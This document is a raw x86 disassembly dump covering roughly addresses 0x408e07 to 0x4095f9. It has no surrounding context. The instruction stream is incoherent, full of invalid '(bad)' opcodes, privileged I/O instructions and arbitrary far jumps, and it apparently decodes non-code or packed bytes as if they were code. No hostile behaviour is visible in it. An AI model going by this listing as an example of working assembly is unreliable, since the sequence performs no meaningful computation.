  408e07:	sbb    DWORD PTR [ecx],0x12
  408e0a:	es pop es
  408e0c:	cmp    eax,0xb88c8387
  408e11:	xabort 0x72
  408e14:	jo     0x408e4d
  408e16:	fnstsw WORD PTR [ebx+0x728d67da]
  408e1c:	retf   
  408e1d:	cmp    esi,eax
  408e1f:	pop    esi
  408e20:	ss xor edx,esi
  408e23:	hlt    
  408e24:	fwait
  408e25:	test   eax,0x4820cd38
  408e2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e2b:	sti    
  408e2c:	dec    esp
  408e2d:	daa    
  408e2e:	jp     0x408e58
  408e30:	loopne 0x408e8d
  408e32:	dec    ecx
  408e33:	repz fbld TBYTE PTR gs:[eax-0x1105a32]
  408e3b:	or     al,0x7c
  408e3d:	pushf  
  408e3e:	popa   
  408e3f:	int    0xbc
  408e41:	xor    BYTE PTR [edx+0x548f987c],al
  408e47:	dec    esi
  408e48:	sub    al,0xb0
  408e4a:	mov    ds:0x32dcf7e,eax
  408e4f:	mov    DWORD PTR ds:0xcf0dce98,ebp
  408e55:	xor    ah,BYTE PTR [edx+0x2d666a6f]
  408e5b:	cmp    al,0xce
  408e5d:	push   es
  408e5e:	pop    edi
  408e5f:	sar    BYTE PTR [edx-0x4f849e50],cl
  408e65:	add    dh,BYTE PTR [esi-0x68]
  408e68:	pop    esi
  408e69:	mov    bh,0x37
  408e6b:	push   edi
  408e6c:	mov    ch,dl
  408e6e:	adc    eax,0xbb9934f
  408e73:	xlat   BYTE PTR ds:[ebx]
  408e74:	jmp    0x549276ab
  408e79:	js     0x408e32
  408e7b:	lahf   
  408e7c:	jp     0x408e04
  408e7e:	dec    edx
  408e7f:	mov    edx,0xcff8325a
  408e84:	(bad)  
  408e85:	inc    DWORD PTR [eax+eiz*4]
  408e88:	mov    cl,0x41
  408e8a:	or     bl,BYTE PTR [esi-0x11]
  408e8d:	sbb    bh,dl
  408e8f:	icebp  
  408e90:	cs (bad) 
  408e92:	jmp    0x8574:0x5fc9cc43
  408e99:	and    DWORD PTR [ebx+0x57b9ecdf],eax
  408e9f:	test   al,0xac
  408ea1:	xor    BYTE PTR [edx-0x54],cl
  408ea4:	popa   
  408ea5:	retf   
  408ea6:	out    0x51,al
  408ea8:	sub    bl,BYTE PTR [edx+eax*8-0x9687b6]
  408eaf:	and    edi,DWORD PTR ss:[ebp+0x73]
  408eb3:	add    bl,dl
  408eb5:	mov    edi,DWORD PTR [ecx+0x2c]
  408eb8:	repz mov ebx,0xa17829cc
  408ebe:	push   0xd0a9f5b0
  408ec3:	cmp    BYTE PTR [ebp-0x19c42586],dl
  408ec9:	add    al,0x8b
  408ecb:	jge    0x408ef1
  408ecd:	or     al,0x6a
  408ecf:	push   ss
  408ed0:	aam    0x52
  408ed2:	pushf  
  408ed3:	push   cx
  408ed5:	add    DWORD PTR [edi-0x3f],ebx
  408ed8:	in     al,dx
  408ed9:	sbb    al,0x40
  408edb:	iret   
  408edc:	jge    0x408ed5
  408ede:	jae    0x408e7b
  408ee0:	mov    dl,0x18
  408ee2:	xchg   ebp,eax
  408ee3:	sti    
  408ee4:	mov    edi,DWORD PTR [eax+0x376ac014]
  408eea:	dec    edi
  408eeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408eec:	shr    cl,0x5f
  408eef:	stc    
  408ef0:	jge    0x408f0b
  408ef2:	cmp    ebx,DWORD PTR [ecx+0x56]
  408ef5:	pushf  
  408ef6:	shl    edi,cl
  408ef8:	xor    bh,BYTE PTR [esi]
  408efa:	sub    ah,bh
  408efc:	adc    BYTE PTR [esi-0x26],0xde
  408f00:	xchg   ebp,eax
  408f01:	sar    DWORD PTR [edi-0x2e],cl
  408f04:	sub    ah,BYTE PTR [ecx]
  408f06:	repnz pop es
  408f08:	xor    eax,0x4d1d1e91
  408f0d:	push   DWORD PTR [ebp+0x3e5c9c83]
  408f13:	xor    DWORD PTR ds:0xeaa9,esi
  408f18:	xor    al,0x40
  408f1a:	jae    0x408ea5
  408f1c:	pusha  
  408f1d:	jne    0x408f40
  408f1f:	cld    
  408f20:	add    edi,DWORD PTR [ecx-0x2b6865e2]
  408f26:	inc    ebx
  408f27:	hlt    
  408f28:	mov    ebx,0xb1bb5b63
  408f2d:	jbe    0x408fa5
  408f2f:	imul   ebx,DWORD PTR [edx],0x4c
  408f32:	adc    BYTE PTR [edi],0xc2
  408f35:	fcmovne st,st(5)
  408f37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f38:	loopne 0x408f02
  408f3a:	xchg   ebp,eax
  408f3b:	addr16 mov cl,0xbd
  408f3e:	(bad)  
  408f3f:	jbe    0x408f79
  408f41:	repz xor BYTE PTR [ebx],0xd7
  408f45:	sub    BYTE PTR [esi+0x529ff656],dh
  408f4b:	sbb    dl,BYTE PTR [ebx+0x1d]
  408f4e:	pop    esp
  408f4f:	add    dl,0xf6
  408f52:	sbb    BYTE PTR ds:0x3d19d371,dh
  408f58:	mov    cs,WORD PTR [edx]
  408f5a:	sub    bh,al
  408f5c:	pop    eax
  408f5d:	mov    ecx,0xb0835d5c
  408f62:	aam    0x7a
  408f64:	push   0x7f
  408f66:	ds sbb al,bl
  408f69:	pop    ebp
  408f6a:	rcl    DWORD PTR [ebx+0x78],0xaf
  408f6e:	mov    bh,0x8b
  408f70:	mov    ah,0xb7
  408f72:	jl     0x408f3c
  408f74:	call   DWORD PTR [ebx-0x56]
  408f77:	ss inc ebx
  408f79:	sub    ecx,ebx
  408f7b:	jmp    0x408f43
  408f7d:	call   esi
  408f7f:	cmc    
  408f80:	rcl    DWORD PTR [edi-0xa0947fb],1
  408f86:	mov    edx,0xd1fa0ce
  408f8b:	mov    ah,0xbd
  408f8d:	shr    edx,1
  408f8f:	fmul   QWORD PTR [ecx+ebp*4-0xb10bc77]
  408f96:	int3   
  408f97:	pop    edx
  408f98:	jmp    0xd5040d6c
  408f9d:	xlat   BYTE PTR ds:[ebx]
  408f9e:	es mov dh,0x3e
  408fa1:	mov    ds:0xdc8b5484,al
  408fa6:	pusha  
  408fa7:	dec    edx
  408fa8:	dec    esi
  408fa9:	imul   eax,DWORD PTR [eax+0x3576e3c6],0xffffffd5
  408fb0:	push   ss
  408fb1:	push   ebx
  408fb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fb3:	shr    ecx,1
  408fb5:	scas   al,BYTE PTR es:[edi]
  408fb6:	sbb    al,0xbb
  408fb8:	(bad)  
  408fb9:	call   0x2874:0xe27682ad
  408fc0:	fst    DWORD PTR [ebp-0x7d00b1c8]
  408fc6:	sbb    bl,BYTE PTR [edx]
  408fc8:	cmp    esp,eax
  408fca:	shl    DWORD PTR [eax],cl
  408fcc:	xlat   BYTE PTR ds:[ebx]
  408fcd:	pop    esp
  408fce:	data16 or ah,BYTE PTR [ebp*1-0x3fde6e2f]
  408fd6:	mov    ebx,0xc86335b
  408fdb:	ret    
  408fdc:	in     eax,dx
  408fdd:	dec    edi
  408fde:	or     eax,0x7c4e78b2
  408fe3:	cmp    eax,0xf1f28774
  408fe8:	out    dx,eax
  408fe9:	cmp    DWORD PTR [ebx*2-0x715339c3],0x662cda53
  408ff4:	add    ebx,DWORD PTR [edi-0x6b0f93fb]
  408ffa:	es repz sbb eax,0xfc19d8f5
  409001:	aad    0xa6
  409003:	or     DWORD PTR [eax],0x8
  409006:	hlt    
  409007:	jmp    DWORD PTR [edi+0x1ed4fa39]
  40900d:	xor    BYTE PTR [edi],bh
  40900f:	fisttp QWORD PTR [esi+0x4880acd8]
  409015:	add    eax,DWORD PTR [edx-0x62]
  409018:	dec    ebp
  409019:	or     eax,0xae2ea18b
  40901e:	retf   
  40901f:	(bad)  
  409020:	nop
  409021:	pop    esi
  409022:	and    ecx,DWORD PTR [eax-0x12]
  409025:	in     eax,0x5d
  409027:	pusha  
  409028:	jno    0x40903b
  40902a:	pop    edi
  40902b:	mov    edx,0x839250b8
  409030:	sbb    al,0x8a
  409032:	pop    edi
  409033:	add    DWORD PTR [ebx],esp
  409035:	sbb    ah,dl
  409037:	inc    edi
  409038:	pop    esi
  409039:	inc    esi
  40903a:	xchg   BYTE PTR ds:0x17f7ed79,ch
  409040:	adc    al,0x6f
  409042:	test   al,0x57
  409044:	addr16 add eax,0xe789b46f
  40904a:	mov    edx,DWORD PTR [esi]
  40904c:	dec    ebx
  40904d:	xor    ebx,DWORD PTR [ebx+0x571a36c5]
  409053:	fst    st(0)
  409055:	push   0xe966f812
  40905a:	mov    al,dh
  40905c:	jmp    0xd773:0x278cde81
  409063:	test   BYTE PTR [esp+ecx*2-0x8dabdbd],0x4b
  40906b:	addr16 iret 
  40906d:	adc    eax,0x3a70bb44
  409072:	aam    0x1c
  409074:	sub    edx,ecx
  409076:	jg     0x4090a5
  409078:	xor    DWORD PTR [ebp-0x67],0x4d
  40907c:	retf   0xd72c
  40907f:	xor    al,0x8b
  409081:	add    edi,DWORD PTR [edi-0x1a]
  409084:	sub    bh,dl
  409086:	jne    0x40904e
  409088:	sbb    BYTE PTR [ebx+0x7c7b31a2],dh
  40908e:	iret   
  40908f:	retf   0x655
  409092:	pop    ds
  409093:	call   0xab651647
  409098:	cmc    
  409099:	xchg   edx,eax
  40909a:	imul   esp,esi,0x6832e1c6
  4090a0:	lock cmp BYTE PTR ds:0x62918241,bh
  4090a7:	lods   eax,DWORD PTR ds:[esi]
  4090a8:	jmp    0x3b21dd25
  4090ad:	inc    esi
  4090ae:	sahf   
  4090af:	jne    0x40907b
  4090b1:	push   ss
  4090b2:	adc    ebp,DWORD PTR [ecx]
  4090b4:	jmp    0x16589395
  4090b9:	mov    WORD PTR [ebp-0x3b],gs
  4090bc:	in     eax,dx
  4090bd:	adc    al,BYTE PTR [esi+eax*2]
  4090c0:	add    esi,DWORD PTR [edi]
  4090c2:	fadd   st(0),st
  4090c4:	je     0x4090f6
  4090c6:	sub    eax,0x739ef0c8
  4090cb:	mov    bl,BYTE PTR [edi]
  4090cd:	cdq    
  4090ce:	adc    ecx,esp
  4090d0:	jmp    0x409137
  4090d2:	mov    edx,0x55e15640
  4090d7:	sub    DWORD PTR [edi+eiz*2+0x5f],esp
  4090db:	or     al,0x41
  4090dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090de:	nop
  4090df:	dec    esp
  4090e0:	loope  0x4090d3
  4090e2:	push   esp
  4090e3:	jge    0x4090bd
  4090e5:	add    eax,0x3cd76fbe
  4090ea:	out    dx,eax
  4090eb:	fsubr  st(0),st
  4090ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090ee:	and    BYTE PTR [ecx-0x16],bh
  4090f1:	das    
  4090f2:	loop   0x409168
  4090f4:	sti    
  4090f5:	jge    0x409097
  4090f7:	dec    ebp
  4090f8:	ins    DWORD PTR es:[edi],dx
  4090f9:	cmp    al,0xdd
  4090fb:	icebp  
  4090fc:	(bad)  
  4090fd:	popa   
  4090fe:	cmp    eax,0x1b33f540
  409103:	test   eax,0x25b72188
  409108:	retf   0x3d6c
  40910b:	pop    edi
  40910c:	es test eax,0x25403a2e
  409112:	out    dx,al
  409113:	xor    eax,0xd1d2b48d
  409118:	and    BYTE PTR [esp+ecx*8-0x73],bh
  40911c:	into   
  40911d:	cmp    bl,bl
  40911f:	pop    edx
  409120:	popf   
  409121:	repnz xchg ebp,eax
  409123:	jae    0x409171
  409125:	cmp    eax,0x13aae62c
  40912a:	ret    
  40912b:	add    edi,esi
  40912d:	lds    esp,FWORD PTR [eax]
  40912f:	xor    al,0xe2
  409131:	mov    ah,0xe3
  409133:	xor    ebp,DWORD PTR [ecx-0x6df81737]
  409139:	cli    
  40913a:	jbe    0x40912d
  40913c:	dec    eax
  40913d:	repz in eax,dx
  40913f:	aad    0xfc
  409141:	cmp    ch,BYTE PTR [ebx+eax*4]
  409144:	mov    bh,0x2a
  409146:	add    eax,0x77466f29
  40914b:	mov    esi,0xc136aa5b
  409150:	or     DWORD PTR [edi-0x213a17f9],eax
  409156:	int3   
  409157:	sub    esi,DWORD PTR [ebp+0x2a]
  40915a:	mov    ebx,0x2117f29c
  40915f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409160:	or     eax,0x74876084
  409165:	fld    QWORD PTR [edx-0x12]
  409168:	mov    al,ds:0xad5aca71
  40916d:	call   0x46e0087
  409172:	xchg   ebx,eax
  409173:	mov    esp,0x21a2f46d
  409178:	inc    esp
  409179:	dec    eax
  40917a:	jo     0x40911a
  40917c:	sbb    DWORD PTR ds:0x8d39b530,esi
  409182:	push   esp
  409183:	push   edi
  409184:	mov    ds:0xa1a345fa,al
  409189:	je     0x4091de
  40918b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40918c:	inc    edi
  40918d:	sbb    eax,0xbadd0ed4
  409192:	xchg   esp,eax
  409193:	xor    dl,cl
  409195:	mov    ecx,0xeadad5dd
  40919a:	push   0xbfa983a6
  40919f:	sub    eax,DWORD PTR [edi+0x179b232a]
  4091a5:	ds jae 0x409174
  4091a8:	aaa    
  4091a9:	retf   
  4091aa:	vpshaq ymm7,[eax-0x77],xmm4
  4091b0:	jg     0x409169
  4091b2:	jmp    0x739b00c1
  4091b7:	scas   eax,DWORD PTR es:[edi]
  4091b8:	(bad)  
  4091b9:	call   0x73c4:0xd11f1ff9
  4091c0:	xchg   ebx,eax
  4091c1:	jle    0x409165
  4091c3:	xchg   edx,eax
  4091c4:	div    ch
  4091c6:	xor    BYTE PTR [esi+0x3e9f65b2],ch
  4091cc:	(bad)  
  4091cd:	loop   0x4091ae
  4091cf:	cmp    ebp,DWORD PTR [edi]
  4091d1:	add    dh,ch
  4091d3:	pop    ss
  4091d4:	in     eax,0x1c
  4091d6:	mov    al,ds:0x2223d5d7
  4091db:	pusha  
  4091dc:	sub    ah,BYTE PTR [edi]
  4091de:	sub    ch,dh
  4091e0:	push   ebx
  4091e1:	div    DWORD PTR [esi+0x71c0a624]
  4091e7:	xchg   ebx,eax
  4091e8:	(bad)  
  4091e9:	adc    eax,0xf41e3f10
  4091ee:	jecxz  0x409230
  4091f0:	pop    edi
  4091f1:	cmp    al,0xce
  4091f3:	ja     0x4091a2
  4091f5:	inc    edx
  4091f6:	fisub  DWORD PTR [ebx+0x5ceff0c]
  4091fc:	aas    
  4091fd:	adc    eax,0xf98fb0cb
  409202:	fs popa 
  409204:	cmc    
  409205:	lgs    ebp,FWORD PTR [ebp+eiz*4-0x16]
  40920a:	jns    0x4091a3
  40920c:	mov    ebp,0xb11b222b
  409211:	xchg   edi,eax
  409212:	lods   al,BYTE PTR ds:[esi]
  409213:	jae    0x4091a6
  409215:	ss mov ecx,0xae283f8
  40921b:	nop
  40921c:	adc    DWORD PTR [ebx],ebx
  40921e:	test   BYTE PTR [esi],dl
  409220:	cmp    al,0xb8
  409222:	scas   eax,DWORD PTR es:[edi]
  409223:	pop    esp
  409224:	mov    bl,0x71
  409226:	jno    0x40920c
  409228:	retf   
  409229:	icebp  
  40922a:	lahf   
  40922b:	ficom  DWORD PTR [esi]
  40922d:	dec    esi
  40922e:	scas   al,BYTE PTR es:[edi]
  40922f:	stc    
  409230:	data16 mov ds:0xa6c133e5,al
  409236:	lahf   
  409237:	not    DWORD PTR [ebp+0x37]
  40923a:	mov    esi,0x1fa8675c
  40923f:	mov    DWORD PTR [esi-0x3e],ebp
  409242:	(bad)  
  409243:	fisttp WORD PTR [ebx+0x18]
  409246:	(bad)  
  409247:	mov    al,0x4
  409249:	mov    bl,0xe9
  40924b:	cmp    ebx,ecx
  40924d:	mov    esp,ds
  40924f:	or     dl,0xda
  409252:	cmc    
  409253:	loope  0x409247
  409255:	pop    ebp
  409256:	imul   esi,DWORD PTR [ebx-0x33b73767],0x60
  40925d:	dec    esp
  40925e:	fdiv   st,st(2)
  409260:	dec    esi
  409261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409262:	pushf  
  409263:	std    
  409264:	xor    DWORD PTR [ebx],esp
  409266:	mov    eax,0x3aae42c7
  40926b:	dec    esp
  40926c:	std    
  40926d:	dec    ecx
  40926e:	sar    DWORD PTR [edi+edi*2],1
  409271:	dec    esp
  409272:	push   esp
  409273:	xor    al,0xac
  409275:	or     ebp,ecx
  409277:	mov    edi,0x30033cae
  40927c:	(bad)  
  40927d:	fwait
  40927e:	in     ax,dx
  409280:	jnp    0x40923b
  409282:	xlat   BYTE PTR ds:[ebx]
  409283:	pop    DWORD PTR [esi+0x247cc7bf]
  409289:	lahf   
  40928a:	mov    ?,WORD PTR [edi+0x1b]
  40928d:	out    dx,eax
  40928e:	jnp    0x4092d4
  409290:	in     eax,dx
  409291:	shl    BYTE PTR [ebp+0x6a35d9a0],0x8a
  409298:	mov    bh,0x24
  40929a:	inc    eax
  40929b:	(bad)  
  40929e:	adc    BYTE PTR [ecx-0x32787445],dh
  4092a4:	popf   
  4092a5:	cmp    BYTE PTR [edx-0x41729d32],bl
  4092ab:	mov    bh,0xf0
  4092ad:	rcl    BYTE PTR [esi+eiz*8+0x43],0xde
  4092b2:	or     esi,DWORD PTR [ecx-0x2b1e9392]
  4092b8:	int    0x31
  4092ba:	xchg   edi,eax
  4092bb:	mov    bl,0x12
  4092bd:	adc    BYTE PTR [eax+0xd],0xd0
  4092c1:	mov    BYTE PTR [edi],ch
  4092c3:	fwait
  4092c4:	retf   0xaa23
  4092c7:	or     edi,DWORD PTR [edi-0x69]
  4092ca:	sbb    eax,0x361d83f3
  4092cf:	mov    ds:0x7a586363,eax
  4092d4:	dec    ecx
  4092d5:	sbb    bh,BYTE PTR [esi]
  4092d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092d8:	cmp    BYTE PTR [ebx+edi*2+0xb],ah
  4092dc:	cli    
  4092dd:	lock out dx,al
  4092df:	inc    edi
  4092e0:	std    
  4092e1:	iret   
  4092e2:	ins    BYTE PTR es:[edi],dx
  4092e3:	and    BYTE PTR [ebp+0x68],cl
  4092e6:	sar    ebp,1
  4092e8:	cmp    al,0x4e
  4092ea:	and    BYTE PTR [ebx+ebp*4],bl
  4092ed:	push   ebp
  4092ee:	pop    ecx
  4092ef:	aas    
  4092f0:	mov    WORD PTR ds:0x6a0fa999,es
  4092f6:	retf   
  4092f7:	xchg   esi,eax
  4092f8:	dec    esi
  4092f9:	pop    esp
  4092fa:	adc    dh,BYTE PTR [eax]
  4092fc:	repnz pusha 
  4092fe:	(bad)  
  4092ff:	loop   0x40931d
  409301:	xchg   esi,eax
  409302:	cli    
  409303:	cmp    BYTE PTR [esi+edx*8],cl
  409306:	popf   
  409307:	ins    BYTE PTR es:[edi],dx
  409308:	repz ds jp 0x40931a
  40930c:	stc    
  40930d:	xchg   ebx,eax
  40930e:	cs cmp cl,0x8d
  409312:	fidivr WORD PTR [ecx]
  409314:	fistp  DWORD PTR [edx]
  409316:	sbb    ecx,DWORD PTR [ebx]
  409318:	test   DWORD PTR [ebp+0xc],eax
  40931b:	jecxz  0x4092ad
  40931d:	push   es
  40931e:	aaa    
  40931f:	jp     0x40934c
  409321:	or     DWORD PTR fs:[edx+0x17efac71],0x60286830
  40932c:	cmp    ecx,0xdd3cc18
  409332:	xchg   ecx,eax
  409333:	fwait
  409334:	stc    
  409335:	addr16 or eax,0x693419c9
  40933b:	clc    
  40933c:	push   ebp
  40933d:	or     bh,0x9c
  409340:	(bad)
  409344:	rcl    DWORD PTR [edi-0x4f],0xd3
  409348:	dec    edx
  409349:	fiadd  DWORD PTR [edx+eiz*1-0x3bc38162]
  409350:	lock ret 0x52f1
  409354:	in     eax,0x73
  409356:	setb   BYTE PTR [ebp-0x31]
  40935a:	xlat   BYTE PTR ds:[ebx]
  40935b:	push   0x3b42d5ad
  409360:	dec    esi
  409361:	sub    BYTE PTR [ebx+0x3f38d1f9],bh
  409367:	and    esp,edx
  409369:	nop
  40936a:	sub    eax,0xde158ba7
  40936f:	push   cs
  409370:	lods   eax,DWORD PTR ds:[esi]
  409371:	rcr    ebp,0x3e
  409374:	addr16 aad 0xc4
  409377:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409378:	enter  0x36d8,0x30
  40937c:	lods   al,BYTE PTR ds:[esi]
  40937d:	int3   
  40937e:	scas   al,BYTE PTR es:[edi]
  40937f:	lds    esi,FWORD PTR [ecx-0x3a]
  409382:	(bad)  
  409383:	push   ds
  409384:	ja     0x4093c2
  409386:	repnz or BYTE PTR [ecx],bl
  409389:	test   al,0x8e
  40938b:	jns    0x409408
  40938d:	call   0x20d87785
  409392:	les    eax,FWORD PTR [esi+0x7a]
  409395:	and    al,0xd4
  409397:	into   
  409398:	test   eax,0xad51a53c
  40939d:	out    dx,al
  40939e:	aad    0x91
  4093a0:	nop
  4093a1:	sub    al,0x1b
  4093a3:	(bad)  
  4093a4:	(bad)  
  4093a5:	mov    bl,0x49
  4093a7:	adc    al,0x65
  4093a9:	dec    eax
  4093aa:	xor    al,BYTE PTR [edx]
  4093ac:	stos   DWORD PTR es:[edi],eax
  4093ad:	or     BYTE PTR [eax+0x2149d4d6],dl
  4093b3:	and    BYTE PTR [edi+0x15],dl
  4093b6:	pop    edi
  4093b7:	jbe    0x4093e9
  4093b9:	inc    ecx
  4093ba:	leave  
  4093bb:	adc    eax,0x41aaebc0
  4093c0:	sbb    ebp,DWORD PTR [edi-0x5d]
  4093c3:	xchg   edx,eax
  4093c4:	adc    BYTE PTR [eax],ch
  4093c6:	jb     0x40937a
  4093c8:	mov    ds:0xb8f9117e,eax
  4093cd:	sbb    BYTE PTR [ebp+0x3ad2132d],dh
  4093d3:	mov    dh,dl
  4093d5:	inc    BYTE PTR [edi]
  4093d7:	ins    DWORD PTR es:[edi],dx
  4093d8:	push   ecx
  4093d9:	lahf   
  4093da:	lahf   
  4093db:	stos   DWORD PTR es:[edi],eax
  4093dc:	pop    esi
  4093dd:	les    edi,FWORD PTR [ecx-0x50]
  4093e0:	jnp    0x40943e
  4093e2:	sar    bl,1
  4093e4:	call   0x7797:0xe9717b9d
  4093eb:	mov    ah,al
  4093ed:	(bad)  
  4093ef:	ins    DWORD PTR es:[edi],dx
  4093f0:	pop    ebp
  4093f1:	(bad)  
  4093f2:	std    
  4093f3:	fs bswap ebx
  4093f6:	ss or  al,0x8
  4093f9:	(bad)  
  4093fa:	(bad)  [eax+edi*2-0x23b67fa2]
  409401:	repz repz or bl,bh
  409405:	pop    ds
  409406:	mov    ebp,DWORD PTR [eax+0x46]
  409409:	pop    ecx
  40940a:	dec    ecx
  40940b:	inc    edx
  40940c:	jnp    0x409393
  40940e:	xor    BYTE PTR [eax],cl
  409410:	and    DWORD PTR [ecx-0x62],edx
  409413:	in     al,0x63
  409415:	repz mov ch,0xee
  409418:	add    DWORD PTR [edi],0x8d3a9be6
  40941e:	ret    
  40941f:	aaa    
  409420:	sti    
  409421:	push   0xffffffc3
  409423:	fild   WORD PTR [ecx+0x14ed59a6]
  409429:	pop    edi
  40942a:	test   DWORD PTR [esi+0x6d],ecx
  40942d:	pushf  
  40942e:	xchg   ebx,eax
  40942f:	or     al,0x3c
  409431:	add    BYTE PTR [edi-0x54c5faa1],bh
  409437:	xor    DWORD PTR [ebx+eiz*4-0x6b],0x75359e3c
  40943f:	fmul   QWORD PTR [edi+0x5d]
  409442:	fmul   QWORD PTR [edi+0x60]
  409445:	and    al,0x10
  409447:	(bad)  
  409448:	fsubr  st(4),st
  40944a:	(bad)  
  40944b:	inc    BYTE PTR [ebx+0xf]
  40944e:	and    ebx,edi
  409450:	xlat   BYTE PTR ds:[ebx]
  409451:	leave  
  409452:	mov    ebp,DWORD PTR [eax+0x6f]
  409455:	mov    ds:0xb05ac2f4,eax
  40945a:	mov    esi,0x81504481
  40945f:	add    al,BYTE PTR [ebx+0x1e]
  409462:	(bad)  
  409463:	and    DWORD PTR [eax+0x4f1b9809],edx
  409469:	and    ebp,DWORD PTR [ebx]
  40946b:	(bad)  
  40946c:	nop
  40946d:	push   esp
  40946e:	ret    
  40946f:	aam    0x19
  409471:	repz sahf 
  409473:	(bad)  
  409474:	fwait
  409475:	add    al,0x34
  409477:	mov    ah,0xaf
  409479:	(bad)  
  40947a:	push   cs
  40947b:	test   eax,0x66b4404c
  409480:	dec    ecx
  409481:	sbb    BYTE PTR [edx+0x22],0x19
  409485:	bound  edx,QWORD PTR [edi]
  409487:	pop    ebx
  409488:	leave  
  409489:	mov    ebx,0xb0efdf33
  40948e:	jp     0x4094f1
  409490:	out    dx,al
  409491:	scas   al,BYTE PTR es:[edi]
  409492:	push   ecx
  409493:	sbb    ebp,DWORD PTR [esi-0x3b0102]
  409499:	pop    ecx
  40949a:	aas    
  40949b:	scas   al,BYTE PTR es:[edi]
  40949c:	mov    BYTE PTR [edx+edx*4-0x77f2d7da],0x14
  4094a4:	mov    BYTE PTR [edi],cl
  4094a6:	push   eax
  4094a7:	data16 jne 0x4094a1
  4094aa:	or     DWORD PTR [ebp-0x5069911c],ecx
  4094b0:	push   edi
  4094b1:	dec    ecx
  4094b2:	pop    ebx
  4094b3:	dec    edx
  4094b4:	mov    al,ds:0xcf3971a1
  4094b9:	sti    
  4094ba:	iret   
  4094bb:	pop    ds
  4094bc:	inc    esp
  4094bd:	stos   BYTE PTR es:[edi],al
  4094be:	and    BYTE PTR [ecx+ebx*2-0x5464eb1e],bh
  4094c5:	add    ecx,ebx
  4094c7:	sbb    al,0x33
  4094c9:	jmp    0x8b71:0xa0ba86f
  4094d0:	popf   
  4094d1:	jne    0x40951a
  4094d3:	fwait
  4094d4:	dec    esp
  4094d5:	in     al,0x7
  4094d7:	cmp    DWORD PTR es:[ebx-0x62],0x7113e263
  4094df:	push   es
  4094e0:	and    ebp,DWORD PTR [ecx]
  4094e2:	dec    esp
  4094e3:	iret   
  4094e4:	lds    edx,FWORD PTR [eax]
  4094e6:	xchg   ebp,eax
  4094e7:	std    
  4094e8:	sbb    eax,0x1256f172
  4094ed:	pop    ebp
  4094ee:	cs and al,0x74
  4094f1:	lock push 0xb236165f
  4094f7:	hlt    
  4094f8:	popf   
  4094f9:	out    dx,eax
  4094fa:	jg     0x4094a8
  4094fc:	push   edx
  4094fd:	(bad)  
  4094fe:	mov    ch,0x83
  409500:	fist   DWORD PTR [edx-0x27b65916]
  409506:	cmovp  ebx,DWORD PTR [ecx-0x6cb50678]
  40950d:	clc    
  40950e:	pop    esi
  40950f:	cmp    ebx,edx
  409511:	je     0x409520
  409513:	jecxz  0x40950f
  409515:	inc    esi
  409516:	add    edi,DWORD PTR [eax+eax*4-0x6c]
  40951a:	xchg   edx,eax
  40951b:	fxtract 
  40951d:	mov    bh,0x5e
  40951f:	mov    es,WORD PTR [eax-0x33fb6afa]
  409525:	fstp   TBYTE PTR [eax+0x2f3dc745]
  40952b:	test   al,0xa8
  40952d:	mov    edi,0x9403c3c6
  409532:	sar    BYTE PTR [ebp-0x37],0xe9
  409536:	in     eax,dx
  409537:	std    
  409538:	add    al,bh
  40953a:	fbld   TBYTE PTR [edi+0xc13829b]
  409540:	mov    bl,0x8e
  409542:	dec    ebx
  409543:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409544:	inc    edx
  409545:	jp     0x4094d0
  409547:	shr    DWORD PTR [esi-0x6],0x23
  40954b:	mov    esp,0xccf33944
  409550:	and    BYTE PTR [edx],bl
  409552:	jg     0x4095b3
  409554:	and    BYTE PTR [ebp+0xf],ah
  409557:	xor    eax,0xfeddeff0
  40955c:	sub    bl,dl
  40955e:	test   eax,0x1aeafb5a
  409563:	retf   0xbcef
  409566:	or     al,0x78
  409568:	or     ecx,esp
  40956a:	lock mov eax,edx
  40956d:	add    DWORD PTR [ecx],edi
  40956f:	mov    ch,0x9c
  409571:	mov    BYTE PTR [esi+0x28],ah
  409574:	dec    eax
  409575:	xchg   esp,eax
  409576:	push   eax
  409577:	inc    edi
  409578:	ret    
  409579:	jecxz  0x40956f
  40957b:	outs   dx,BYTE PTR ds:[esi]
  40957c:	mov    ecx,0xceebb379
  409581:	pop    esi
  409582:	shr    BYTE PTR [ebx+0xd94bfe8],1
  409588:	in     eax,dx
  409589:	mov    al,0x41
  40958b:	hlt    
  40958c:	pop    ebx
  40958d:	test   ch,0x86
  409590:	leave  
  409591:	(bad)  
  409592:	out    0x66,al
  409594:	dec    eax
  409595:	and    DWORD PTR [edi+eiz*2+0x6],0xffffffbd
  40959a:	mov    ch,0xf5
  40959c:	jecxz  0x409575
  40959e:	mov    edi,DWORD PTR ds:0xd74bc4cc
  4095a4:	push   esp
  4095a5:	retf   0xb809
  4095a8:	das    
  4095a9:	inc    ebx
  4095aa:	mov    edx,ecx
  4095ac:	mov    WORD PTR [ecx+0x78f5f150],es
  4095b2:	mov    ah,cl
  4095b4:	icebp  
  4095b5:	fs xor eax,0x1b466d65
  4095bb:	(bad)  
  4095bd:	nop
  4095be:	xor    bl,0xc3
  4095c1:	mov    edi,0x109a83c7
  4095c6:	adc    esp,DWORD PTR [esi]
  4095c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095c9:	cmp    esi,DWORD PTR [ebp-0xd]
  4095cc:	or     BYTE PTR [esp+eax*8+0x7f],al
  4095d0:	aas    
  4095d1:	cwde   
  4095d2:	mov    eax,0xf19c31a
  4095d8:	xchg   ebx,eax
  4095d9:	adc    DWORD PTR [edi+0x10dcc8c1],edx
  4095df:	je     0x409596
  4095e1:	call   0x88e01e3e
  4095e6:	test   DWORD PTR [ebx+0x69321dcf],ecx
  4095ec:	push   ebx
  4095ed:	jl     0x4095eb
  4095ef:	ja     0x409575
  4095f1:	cmp    ecx,ecx
  4095f3:	push   eax
  4095f4:	sub    eax,0x2c3b24d8
  4095f9:	jmp    0xe33b:0x337ac143
